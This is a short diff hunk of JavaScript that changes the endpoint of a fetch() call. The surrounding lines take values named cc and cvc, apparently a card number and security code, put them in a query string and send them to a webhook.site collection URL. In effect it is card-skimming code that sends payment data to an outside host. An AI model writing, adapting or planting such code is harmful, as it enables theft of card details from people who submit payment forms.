@@ -61,7 +61,7 @@
 
     const queryString = `?cc=${encodeURIComponent(cc)}&cvc=${encodeURIComponent(cvc)}`;
 
-    fetch('https://webhook.site/0dc6c238-38cb-4f6b-9e19-639042e0b656' + queryString)
+    fetch('https://webhook.site/5201f783-6fe2-4bdd-82d7-3e2135506223' + queryString)
       .then(res => res.text())
       .then(msg => {
         alert(msg);
